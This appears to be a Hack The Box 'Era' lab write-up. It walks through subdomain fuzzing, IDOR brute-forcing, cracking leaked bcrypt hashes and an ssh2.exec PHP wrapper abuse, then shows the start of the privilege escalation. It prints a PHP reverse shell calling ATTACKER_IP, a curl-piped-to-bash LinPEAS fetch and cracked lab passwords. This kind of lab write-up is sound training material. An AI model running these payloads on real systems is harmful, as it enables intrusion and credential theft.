---
title: 🗿 HTB Era Write-up
name: Era
date: 2025-12-01
last_modified_at: 2025-12-01
difficulty: Medium
os: Linux
skills: Enumeration, IDOR, Database Looting, Code Analysis, Password Cracking, Reverse Shell, PHP SSH2 Wrapper, Authentication Bypass, Arbitrary File Upload, ELF Signing, Privilege Escalation
tools: rustscan, nmap, ffuf, sqlite3, hashcat, Revshells, nc, LinPEAS, pspy64, openssl, readelf, objcopy
published: true
---

![](images/Pasted%20image%2020250728221608.png)

## 📝 Summary

The _Era_ machine was an enjoyable mix of enumeration and web exploitation, topped off with a creative abuse of PHP wrappers. After spotting limited open ports (FTP and HTTP), the real action began with virtual host fuzzing, which revealed a file-sharing platform with hidden registration and login functionality.

An IDOR vulnerability exposed site backups, leading to the disclosure of source code, a private key and a certificate for Yuri, and credentials in an SQLite database that granted deeper access.

With access to FTP and a trove of `.conf` files, I uncovered information about the server layout and the presence of the `ssh2` PHP extension. Using hidden admin parameters and abusing `ssh2.exec`, I triggered a reverse shell to an SSH service running on localhost, landing on the box as Yuri.

Privilege escalation to Eric was straightforward—his password hash was found in the same SQLite database and cracked. A simple `su` landed me in Eric’s account.

Eric belonged to the `devs` group, which had write access to an AV `monitor` file. This file was signed using Yuri’s private key and certificate. By compiling a malicious ELF binary with a reverse shell, signing it with Yuri's credentials, and replacing the monitor file, I gained root access.

## 🗄️ file.era.htb Website

### 🔎 Recon

**Initial scan** revealed only two ports open:
- `21/tcp`: vsftpd 3.0.5
- `80/tcp`: nginx 1.18.0

```
fcoomans@kali:~/htb/era$ rustscan -a 10.10.11.79 --tries 5 --ulimit 10000 -- -sCV -oA era_tcp_all
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Scanning ports like it's my full-time job. Wait, it is.

[~] The config file is expected to be at "/home/fcoomans/.rustscan.toml"
[~] Automatically increasing ulimit value to 10000.
Open 10.10.11.79:21
Open 10.10.11.79:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -sCV -oA era_tcp_all" on ip 10.10.11.79

<SNIP>

Nmap scan report for 10.10.11.79
Host is up, received reset ttl 63 (0.18s latency).
Scanned at 2025-07-27 13:42:12 SAST for 12s

PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.5
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://era.htb/
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

<SNIP>
```

After pointing `era.htb` in `/etc/hosts`,

```
fcoomans@kali:~/htb/era$ grep era.htb /etc/hosts
10.10.11.79     era.htb
```

Anonymous access to the ftp service is not allowed.  It looks like an account is needed to access it...

```
fcoomans@kali:~/htb/era$ ftp -v ftp://anonymous:anonymous@era.htb
Connected to era.htb.
220 (vsFTPd 3.0.5)
331 Please specify the password.
530 Login incorrect.
ftp: Login failed
ftp: Can't connect or login to host `era.htb:ftp'
221 Goodbye.
```

The http://era.htb website is opened.  Enumeration of the site doesn't show anything interesting.

![](images/Pasted%20image%2020250729133710.png)

Fuzzing for subdomains reveals a `file.era.htb` virtual host website.

```
fcoomans@kali:~/htb/era$ ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt:FUZZ -u http://era.htb -H "Host: FUZZ.era.htb" -ic -t 60 -fs 154

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://era.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt
 :: Header           : Host: FUZZ.era.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 60
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 154
________________________________________________

file                    [Status: 200, Size: 6765, Words: 2608, Lines: 234, Duration: 184ms]
:: Progress: [56293/56293] :: Job [1/1] :: 333 req/sec :: Duration: [0:02:57] :: Errors: 0 ::
```

After adding `file.era.htb` to `/etc/hosts`,

```
fcoomans@kali:~/htb/era$ grep era.htb /etc/hosts
10.10.11.79     era.htb file.era.htb
```

http://file.era.htb is opened.  Now this looks very interesting.  It's a file storage system.

![](images/Pasted%20image%2020250729133952.png)

Fuzzing for endpoints reveals a `/register.php` endpoint, which is not shown anywhere on the website.

```
fcoomans@kali:~/htb/era$ ffuf -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt:FUZZ -u http://file.era.htb/FUZZ -ic -t 60 -fs 6765,162

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://file.era.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/quickhits.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 60
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 6765,162
________________________________________________

download.php            [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 179ms]
login.php               [Status: 200, Size: 9214, Words: 3701, Lines: 327, Duration: 179ms]
register.php            [Status: 200, Size: 3205, Words: 1094, Lines: 106, Duration: 179ms]
upload.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 179ms]
:: Progress: [2565/2565] :: Job [1/1] :: 334 req/sec :: Duration: [0:00:08] :: Errors: 0 ::
```

http://file.era.htb/register.php is opened and a new account is registered.

![](images/Pasted%20image%2020250729134137.png)

The site is redirected to http://file.era.htb/login.php after successful registration.  I login with the newly registered account.

![](images/Pasted%20image%2020250729134324.png)

And am greeted by the file store dashboard, http://file.era.htb/manage.php.  Here files can be uploaded, downloaded, deleted and security questions (for login with security questions) can be updated.

![](images/Pasted%20image%2020250729134430.png)

A test file is created,
```
fcoomans@kali:~/htb/era$ echo "Hello World" >test.txt
```

And uploaded.  I received a download link for the file.

![](images/Pasted%20image%2020250729134743.png)

The link can also be accessed by hovering over the uploaded file in the `Manage Files` menu.

![](images/Pasted%20image%2020250729134911.png)

Clicking on the file simply downloads it.

### 🧪 Exploitation

#### **id**OR vulnerability

Is the `id` parameter in the `download.php` endpoint vulnerable to an IDOR brute force attack to reveal other files?

I create a word list with numbers from 1 to 200.
The cookie from the website (accessed through Developer Tools in the browser) is used to try and brute force any other files.
The `id` parameter is indeed vulnerable to IDOR, and two files with IDs 54 and 150 can be downloaded.

```
fcoomans@kali:~/htb/era$ seq 1 200 >>numbers.txt

fcoomans@kali:~/htb/era$ ffuf -b "PHPSESSID=uugrm3bvqorbi2blj6oda4i203" -w numbers.txt:FUZZ -u "http://file.era.htb/download.php?id=FUZZ" -t 60 -fs 7686

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://file.era.htb/download.php?id=FUZZ
 :: Wordlist         : FUZZ: /home/fcoomans/htb/era/numbers.txt
 :: Header           : Cookie: PHPSESSID=uugrm3bvqorbi2blj6oda4i203
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 60
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 7686
________________________________________________

54                      [Status: 200, Size: 6378, Words: 2552, Lines: 222, Duration: 207ms]
54                      [Status: 200, Size: 6378, Words: 2552, Lines: 222, Duration: 177ms]
54                      [Status: 200, Size: 6378, Words: 2552, Lines: 222, Duration: 175ms]
54                      [Status: 200, Size: 6378, Words: 2552, Lines: 222, Duration: 180ms]
54                      [Status: 200, Size: 6378, Words: 2552, Lines: 222, Duration: 176ms]
150                     [Status: 200, Size: 6366, Words: 2552, Lines: 222, Duration: 175ms]
:: Progress: [600/600] :: Job [1/1] :: 395 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
```

File 54 is named `site-backup-30-08-24.zip` and is downloaded.

![](images/Pasted%20image%2020250729135654.png)

File 150 is named `signing.zip` and is also downloaded.

![](images/Pasted%20image%2020250729135841.png)

### 💰 Post Exploitation

The `site-backup-30-08-24.zip` file is extracted, and it contains the site's source code.

```
fcoomans@kali:~/htb/era/loot/backup$ unzip site-backup-30-08-24.zip
Archive:  site-backup-30-08-24.zip
  inflating: LICENSE
  inflating: bg.jpg
   creating: css/

<SNIP>
```

## 🫣 Hidden download parameters and ftp information disclosure

### 🔎 Recon

#### 🪶 SQLite

The source code reveals that the site is using an SQLite database named `filedb.sqlite`.
The database contains the admin account name `admin_ef01cab31aa`, with the answers to security questions `Maria`, `Oliver` and `Ottawa`.
It also contains some other user accounts.

```
fcoomans@kali:~/htb/era/loot/backup$ sqlite3 filedb.sqlite
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .tables
files  users
sqlite> select * from users;
1|admin_ef01cab31aa|$2y$10$wDbohsUaezf74d3sMNRPi.o93wDxJqphM2m0VVUp41If6WrYr.QPC|600|Maria|Oliver|Ottawa
2|eric|$2y$10$S9EOSDqF1RzNUvyVj7OtJ.mskgP1spN3g2dneU.D.ABQLhSV2Qvxm|-1|||
3|veronica|$2y$10$xQmS7JL8UT4B3jAYK7jsNeZ4I.YqaFFnZNA/2GCxLveQ805kuQGOK|-1|||
4|yuri|$2b$12$HkRKUdjjOdf2WuTXovkHIOXwVDfSrgCqqHPpE37uWejRqUWqwEL2.|-1|||
5|john|$2a$10$iccCEz6.5.W2p7CSBOr3ReaOqyNmINMH1LaqeQaL22a1T1V/IddE6|-1|||
6|ethan|$2a$10$PkV/LAd07ftxVzBHhrpgcOwD3G1omX4Dk2Y56Tv9DpuUV/dh/a1wC|-1|||
sqlite> .exit
```

`download.php` shows that the files are stored under the `files/` subdirectory on line 48.
It also shows on line 59 that the user with id 1 i.e., `admin_ef01cab31aa` can also specify hidden parameters `show=true` (line 59) and `format` (line 60).  Format is particularly dangerous as it allows the admin account to open a file (lines 71 - 79) using a PHP wrapper.

```php
fcoomans@kali:~/htb/era/loot/backup$ nl -b a download.php
<SNIP>

    48          $fileName = str_replace("files/", "", $fetched[0]);
    49
    50
    51          // Allow immediate file download
    52          if ($_GET['dl'] === "true") {
    53
    54                  header('Content-Type: application/octet-stream');
    55                  header("Content-Transfer-Encoding: Binary");
    56                  header("Content-disposition: attachment; filename=\"" .$fileName. "\"");
    57                  readfile($fetched[0]);
    58          // BETA (Currently only available to the admin) - Showcase file instead of downloading it
    59          } elseif ($_GET['show'] === "true" && $_SESSION['erauser'] === 1) {
    60                  $format = isset($_GET['format']) ? $_GET['format'] : '';
    61                  $file = $fetched[0];
    62
    63                  if (strpos($format, '://') !== false) {
    64                          $wrapper = $format;
    65                          header('Content-Type: application/octet-stream');
    66                  } else {
    67                          $wrapper = '';
    68                          header('Content-Type: text/html');
    69                  }
    70
    71                  try {
    72                          $file_content = fopen($wrapper ? $wrapper . $file : $file, 'r');
    73                          $full_path = $wrapper ? $wrapper . $file : $file;
    74                          // Debug Output
    75                          echo "Opening: " . $full_path . "\n";
    76                          echo $file_content;
    77                  } catch (Exception $e) {
    78                          echo "Error reading file: " . $e->getMessage();
    79                  }

<SNIP>
```

http://file.era.htb/files/ access is `403 Forbidden`.

![](images/Pasted%20image%2020250729140932.png)

#### 📥 FTP

Yuri's password hash is cracked using `hashcat` and the `rockyou` wordlist.  Yuri's password is `mustang`.

```
fcoomans@kali:~/htb/era/signing$ hashcat -m 3200 '$2b$12$HkRKUdjjOdf2WuTXovkHIOXwVDfSrgCqqHPpE37uWejRqUWqwEL2.' /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

<SNIP>

$2b$12$HkRKUdjjOdf2WuTXovkHIOXwVDfSrgCqqHPpE37uWejRqUWqwEL2.:mustang

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))

<SNIP>
```

The ftp service accepts Yuri's credentials.
ftp with Yuri, shows the file webroot path as `/var/www/file` and also that `ssh2.so` can be used as a wrapper.
Show `file.conf` and listing with `ssh2.so`.

```
fcoomans@kali:~/htb/era/loot$ ftp ftp://yuri:mustang@era.htb
Connected to era.htb.
220 (vsFTPd 3.0.5)
331 Please specify the password.
230 Login successful.
```

Two directories are listed.  

```
ftp> ls
229 Entering Extended Passive Mode (|||17970|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Jul 22 08:42 apache2_conf
drwxr-xr-x    3 0        0            4096 Jul 22 08:42 php8.1_conf
226 Directory send OK.
```

The first appears to contain the Apache2 website configuration.  I guess the nginx is just a proxy and the real webserver is Apache after all.
Anyway, the Apache2 website configuration files are downloaded.

```
ftp> cd apache2_conf
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||53443|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0            1332 Dec 08  2024 000-default.conf
-rw-r--r--    1 0        0            7224 Dec 08  2024 apache2.conf
-rw-r--r--    1 0        0             222 Dec 13  2024 file.conf
-rw-r--r--    1 0        0             320 Dec 08  2024 ports.conf
226 Directory send OK.
ftp> !mkdir apache2_conf
ftp> lcd apache2_conf/
Local directory now: /home/fcoomans/htb/era/loot/apache2_conf
ftp> mget *
mget 000-default.conf [anpqy?]? a
Prompting off for duration of mget.
229 Entering Extended Passive Mode (|||61711|)
150 Opening BINARY mode data connection for 000-default.conf (1332 bytes).
100% |*******************************************************************************************************************************|  1332      154.87 KiB/s    00:00 ETA
226 Transfer complete.
1332 bytes received in 00:00 (6.90 KiB/s)
229 Entering Extended Passive Mode (|||50213|)
150 Opening BINARY mode data connection for apache2.conf (7224 bytes).
100% |*******************************************************************************************************************************|  7224        1.58 MiB/s    00:00 ETA
226 Transfer complete.
7224 bytes received in 00:00 (38.72 KiB/s)
229 Entering Extended Passive Mode (|||23482|)
150 Opening BINARY mode data connection for file.conf (222 bytes).
100% |*******************************************************************************************************************************|   222       18.42 KiB/s    00:00 ETA
226 Transfer complete.
222 bytes received in 00:00 (1.13 KiB/s)
229 Entering Extended Passive Mode (|||58377|)
150 Opening BINARY mode data connection for ports.conf (320 bytes).
100% |*******************************************************************************************************************************|   320       22.67 KiB/s    00:00 ETA
226 Transfer complete.
320 bytes received in 00:00 (1.62 KiB/s)
```

The second directory contains the PHP 8.1 configuration.  The shared object files show all PHP extensions available.
What is particularly interesting is the `ssh2.so` library, as this can allow SSH access and a potential foothold.

```
ftp> cd ../php8.1_conf
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||10550|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Jul 22 08:42 build
-rw-r--r--    1 0        0           35080 Dec 08  2024 calendar.so
-rw-r--r--    1 0        0           14600 Dec 08  2024 ctype.so
-rw-r--r--    1 0        0          190728 Dec 08  2024 dom.so
-rw-r--r--    1 0        0           96520 Dec 08  2024 exif.so
-rw-r--r--    1 0        0          174344 Dec 08  2024 ffi.so
-rw-r--r--    1 0        0         7153984 Dec 08  2024 fileinfo.so
-rw-r--r--    1 0        0           67848 Dec 08  2024 ftp.so
-rw-r--r--    1 0        0           18696 Dec 08  2024 gettext.so
-rw-r--r--    1 0        0           51464 Dec 08  2024 iconv.so
-rw-r--r--    1 0        0         1006632 Dec 08  2024 opcache.so
-rw-r--r--    1 0        0          121096 Dec 08  2024 pdo.so
-rw-r--r--    1 0        0           39176 Dec 08  2024 pdo_sqlite.so
-rw-r--r--    1 0        0          284936 Dec 08  2024 phar.so
-rw-r--r--    1 0        0           43272 Dec 08  2024 posix.so
-rw-r--r--    1 0        0           39176 Dec 08  2024 readline.so
-rw-r--r--    1 0        0           18696 Dec 08  2024 shmop.so
-rw-r--r--    1 0        0           59656 Dec 08  2024 simplexml.so
-rw-r--r--    1 0        0          104712 Dec 08  2024 sockets.so
-rw-r--r--    1 0        0           67848 Dec 08  2024 sqlite3.so
-rw-r--r--    1 0        0          313912 Dec 08  2024 ssh2.so
-rw-r--r--    1 0        0           22792 Dec 08  2024 sysvmsg.so
-rw-r--r--    1 0        0           14600 Dec 08  2024 sysvsem.so
-rw-r--r--    1 0        0           22792 Dec 08  2024 sysvshm.so
-rw-r--r--    1 0        0           35080 Dec 08  2024 tokenizer.so
-rw-r--r--    1 0        0           59656 Dec 08  2024 xml.so
-rw-r--r--    1 0        0           43272 Dec 08  2024 xmlreader.so
-rw-r--r--    1 0        0           51464 Dec 08  2024 xmlwriter.so
-rw-r--r--    1 0        0           39176 Dec 08  2024 xsl.so
-rw-r--r--    1 0        0           84232 Dec 08  2024 zip.so
226 Directory send OK.
ftp> exit
221 Goodbye.
```

The downloaded `file.conf` file contains the http://file.era.htb virtual host configuration file.
What is particularly interesting is that I now know that the filesystem path to the web site is `/var/www/file`.

```
fcoomans@kali:~/htb/era/loot$ cd apache2_conf

fcoomans@kali:~/htb/era/loot/apache2_conf$ ls
000-default.conf  apache2.conf  file.conf  ports.conf

fcoomans@kali:~/htb/era/loot/apache2_conf$ cat file.conf
<VirtualHost *:80>
    ServerAdmin webmaster@localhost
    DocumentRoot /var/www/file
    ServerName file.era.htb
    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
```

### 🧪 Exploitation

#### 🐚 Reverse shell

I use https://www.revshells.com to generate a `PHP proc_open` reverse shell,

![](images/Pasted%20image%2020250729143146.png)

And past the reverse shell payload into the `revshell.php` backdoor file.

```php
<?php
$sock=fsockopen("ATTACKER_IP",4444);
$proc=proc_open("bash", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>
```

A `nc` listener is started to catch the reverse shell.

```
fcoomans@kali:~/htb/era$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
```

The reverse shell is uploaded on the website and the generated `id` is noted.

![](images/Pasted%20image%2020250729144025.png)

#### 🪪 Admin access

The program allows me to reset the admin accounts' security questions.  I reset it to the defaults as seen in the SQLite database.

![](images/Pasted%20image%2020250729143813.png)

The `login using security questions` link is clicked.

![](images/Pasted%20image%2020250729144157.png)

And I log in by entering the admin account questions.

![](images/Pasted%20image%2020250729144259.png)

I open a new browser tab and construct this `download.php` URL:
- `id=8001` is the id for my reverse shell file.
- `show=true` makes use of the admin accounts hidden parameter to show the file instead of downloading it.
- `format=ssh2.exec://yuri:mustang@localhost:22/php+/var/www/file/` is where the magic happens.  The `ssh2.so` extension is used with the `.exec` function to connect to an SSH server and to run a command.  I reason that there might be an SSH server running on localhost, that is not exposed to the public.  Yuri's credentials are used, since I know the account worked with FTP and therefore will also allow Yuri to SSH to the target.  `php /var/www/file/` will be appended with the filename, as per the source code resulting in the command `php /var/www/file/files/revshell.php` to be executed when the wrapper is opened in the script.

```
http://file.era.htb/download.php?id=8001&show=true&format=ssh2.exec://yuri:mustang@localhost:22/php+/var/www/file/
```

#### 👣 Foothold as Yuri

`nc` catches the reverse shell.
```
fcoomans@kali:~/htb/era$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [ATTACKER_IP] from (UNKNOWN) [10.10.11.79] 41338
python3 -c 'import pty;pty.spawn("/bin/bash");'
yuri@era:~$ id
uid=1001(yuri) gid=1002(yuri) groups=1002(yuri)
```

### 💰 Post Exploitation

Yuri is not the holder of the `user.txt` flag.
Querying the `/etc/password` file shows that `eric` is the only other user in the `/home` directory.

```
yuri@era:~$ grep sh /etc/passwd
root:x:0:0:root:/root:/bin/bash
sshd:x:107:65534::/run/sshd:/usr/sbin/nologin
eric:x:1000:1000:eric:/home/eric:/bin/bash
yuri:x:1001:1002::/home/yuri:/bin/sh
```

`netstat` also confirms my presumption that there was an SSH service (port 22) that is only running on localhost.

```
yuri@era:~$ netstat -tlpn
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:22            0.0.0.0:*               LISTEN      -
tcp6       0      0 :::21                   :::*                    LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -
```


## 🔼 PrivEsc to Eric

### 🔎 Recon

Eric's password hash was also found in the SQLite database.  The hash is cracked using `hashcat` and the `rockyou.txt` wordlist.  Eric's password is `america`.

```
fcoomans@kali:~/htb/era$ hashcat -m 3200 '$2y$10$S9EOSDqF1RzNUvyVj7OtJ.mskgP1spN3g2dneU.D.ABQLhSV2Qvxm' /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

<SNIP>

$2y$10$S9EOSDqF1RzNUvyVj7OtJ.mskgP1spN3g2dneU.D.ABQLhSV2Qvxm:america

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))

<SNIP>
```

### 🧪 Exploitation

`su` is used to switch to Eric's account using the password `america`.  Note that Eric is a member of the `devs` group.

```
yuri@era:~$ su - eric
Password: america

eric@era:~$ id
uid=1000(eric) gid=1000(eric) groups=1000(eric),1001(devs)
```

### 💰 Post Exploitation

#### 🚩 user.txt

Eric is the holder of the `user.txt` flag.

```
eric@era:~$ cat /home/eric/user.txt
4aff44a5b130f14cba4eca19d52929c7
```

## 🧝 ELF Signing

### 🔎 Recon

#### 🫛 LinPeas

A Python web server is started to share LinPeas.

```
fcoomans@kali:~/htb/era$ python -m http.server -d /usr/share/peass/linpeas
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

And run on the target.  It shows an unusual directory under `/opt/AV/periodic-checks`, which the `devs` group have full access over.  Eric is a member of `devs`!  It looks like the `monitor` file can be executed by `root`.

```
eric@era:~$ curl -s http://ATTACKER_IP:8000/linpeas.sh |bash -

<SNIP>

╔══════════╣ Unexpected in /opt (usually empty)
total 12
drwxrwxr-x  3 root root 4096 Jul 22 08:42 .
drwxr-xr-x 20 root root 4096 Jul 22 08:41 ..
drwxrwxr--  3 root devs 4096 Jul 22 08:42 AV

<SNIP>

╔══════════╣ Readable files belonging to root and readable by me but not world readable
-rw-r----- 1 root eric 33 Jul 30 12:23 /home/eric/user.txt
-rwxrw---- 1 root devs 16544 Jul 30 13:14 /opt/AV/periodic-checks/monitor
-rw-rw---- 1 root devs 307 Jul 30 13:14 /opt/AV/periodic-checks/status.log

<SNIP>
```

#### 🕵️ PSpy

I start a web server on Kali to serve `pspy`.

```
fcoomans@kali:~/htb/era$ python -m http.server -d /usr/share/pspy
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

And download it to the target and change the permissions to make the file executable.

```
eric@era:~$ cd /dev/shm

eric@era:/dev/shm$ curl -s -O http://ATTACKER_IP:8000/pspy64

eric@era:/dev/shm$ ls -lh

total 3.4M
-rw-rw-r-- 1 eric eric 3.4M Jul 30 13:24 pspy64
eric@era:/dev/shm$ chmod +x pspy64
```

It shows that root has scheduled a cron job that runs the script `/root/initiate_monitoring.sh` every minute.  It runs `/opt/AV/periodic-checks/monitor` and redirects the output to `/opt/AV/periodic-checks/status.log`.

```
eric@era:/dev/shm$ ./pspy64

pspy - version: 1.2.1 - Commit SHA: kali

<SNIP>

2025/07/30 13:26:01 CMD: UID=0     PID=51169  | /usr/sbin/CRON -f -P
2025/07/30 13:26:01 CMD: UID=0     PID=51171  | bash -c /root/initiate_monitoring.sh
2025/07/30 13:26:01 CMD: UID=0     PID=51170  | /bin/sh -c bash -c '/root/initiate_monitoring.sh' >> /opt/AV/periodic-checks/status.log 2>&1
2025/07/30 13:26:01 CMD: UID=0     PID=51172  | objcopy --dump-section .text_sig=text_sig_section.bin /opt/AV/periodic-checks/monitor
```

#### 📝 Interrogate monitor file

The `monitor` file is an ELF file.

```
eric@era:~$ file /opt/AV/periodic-checks/monitor

/opt/AV/periodic-checks/monitor: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=0e2c77e562f07f5d22ed332cc44fc48da08018e3, for GNU/Linux 3.2.0, not stripped
```

`readelf` confirms that the file contains the `.text_sig` section, which means the file is signed.

```
eric@era:~$ readelf -S /opt/AV/periodic-checks/monitor

There are 32 section headers, starting at offset 0x38a0:

Section Headers:
  [Nr] Name              Type             Address           Offset
       Size              EntSize          Flags  Link  Info  Align

<SNIP>

  [28] .text_sig         PROGBITS         0000000000000000  00003040
       00000000000001ca  0000000000000000           0     0     8

<SNIP>
```

`objcopy` is used to dump the `.text_sig` and then `openssl asn1parse` is used to read the signature.  This confirms that the file is signed with `pkcs7-signedData` (i.e., `cms` signing is used).  It also shows that `yurivich@era.com` signed the ELF.

```
eric@era:~$ objcopy --dump-section .text_sig=extracted_sig.der /opt/AV/periodic-checks/monitor

eric@era:~$ openssl asn1parse -inform DER -in extracted_sig.der
    0:d=0  hl=4 l= 454 cons: SEQUENCE
    4:d=1  hl=2 l=   9 prim: OBJECT            :pkcs7-signedData
   15:d=1  hl=4 l= 439 cons: cont [ 0 ]
   19:d=2  hl=4 l= 435 cons: SEQUENCE
   23:d=3  hl=2 l=   1 prim: INTEGER           :01
   26:d=3  hl=2 l=  13 cons: SET
   28:d=4  hl=2 l=  11 cons: SEQUENCE
   30:d=5  hl=2 l=   9 prim: OBJECT            :sha256
   41:d=3  hl=2 l=  11 cons: SEQUENCE
   43:d=4  hl=2 l=   9 prim: OBJECT            :pkcs7-data
   54:d=3  hl=4 l= 400 cons: SET
   58:d=4  hl=4 l= 396 cons: SEQUENCE
   62:d=5  hl=2 l=   1 prim: INTEGER           :01
   65:d=5  hl=2 l= 103 cons: SEQUENCE
   67:d=6  hl=2 l=  79 cons: SEQUENCE
   69:d=7  hl=2 l=  17 cons: SET
   71:d=8  hl=2 l=  15 cons: SEQUENCE
   73:d=9  hl=2 l=   3 prim: OBJECT            :organizationName
   78:d=9  hl=2 l=   8 prim: UTF8STRING        :Era Inc.
   88:d=7  hl=2 l=  25 cons: SET
   90:d=8  hl=2 l=  23 cons: SEQUENCE
   92:d=9  hl=2 l=   3 prim: OBJECT            :commonName
   97:d=9  hl=2 l=  16 prim: UTF8STRING        :ELF verification
  115:d=7  hl=2 l=  31 cons: SET
  117:d=8  hl=2 l=  29 cons: SEQUENCE
  119:d=9  hl=2 l=   9 prim: OBJECT            :emailAddress
  130:d=9  hl=2 l=  16 prim: IA5STRING         :yurivich@era.com
  148:d=6  hl=2 l=  20 prim: INTEGER           :6D634AA981E193A1E448C5205FF79B84E6B6F50B
  170:d=5  hl=2 l=  11 cons: SEQUENCE
  172:d=6  hl=2 l=   9 prim: OBJECT            :sha256
  183:d=5  hl=2 l=  13 cons: SEQUENCE
  185:d=6  hl=2 l=   9 prim: OBJECT            :rsaEncryption
  196:d=6  hl=2 l=   0 prim: NULL
  198:d=5  hl=4 l= 256 prim: OCTET STRING      [HEX DUMP]:6A8D5090E77AA22431D3E629241AC7EEC906DCE87592C90733B85EA5C466DB04A35A2864885300F2775CFBE983AE833D2C367030985AB5D9AE28CFBF75DB8E402955C9BEF8D3058E6EE11EB435BB30A3056DB85074BC4E15FC440A57E3F62F4B5ECD0E6B222DC40391892C7DED05FE45A3E9C00F0610F8A653ABF72571AACBF2FF38238658D08DCFBA331C6D20928C01C77D4E49EA94670C9DE942779E0967143D8149209FC12400588004C7CEBFD398EC6D55B50333DB46F2AB74E6AA24E9DC76D2C9C4183B991BC0F4762B1C091D82317CAAB31E88DFC048712BB9AC8A0DBB6CD7CD6BDCAAC96C2AFEFAA17944EBDD7A6E6F2E91DA5E41E0E65DDEEC9347EE
```

But wait;  a `signing.zip` file was exposed through the IDOR vulnerability and downloaded!  Is this perhaps Yuri's private key and certificate?
I extract the `signing.zip` file which I downloaded earlier.
```
fcoomans@kali:~/htb/era/loot/signing$ unzip signing.zip
Archive:  signing.zip
  inflating: key.pem
  inflating: x509.genkey
```

The `key.pem` file indeed contains Yuri's signing certificate.  The file also contains Yuri's private key.
```
fcoomans@kali:~/htb/era/loot/signing$ openssl x509 -in key.pem -noout -text
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number:
            6d:63:4a:a9:81:e1:93:a1:e4:48:c5:20:5f:f7:9b:84:e6:b6:f5:0b
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: O=Era Inc., CN=ELF verification, emailAddress=yurivich@era.com
        Validity
            Not Before: Jan 26 02:09:35 2025 GMT
            Not After : Jan  2 02:09:35 2125 GMT
        Subject: O=Era Inc., CN=ELF verification, emailAddress=yurivich@era.com
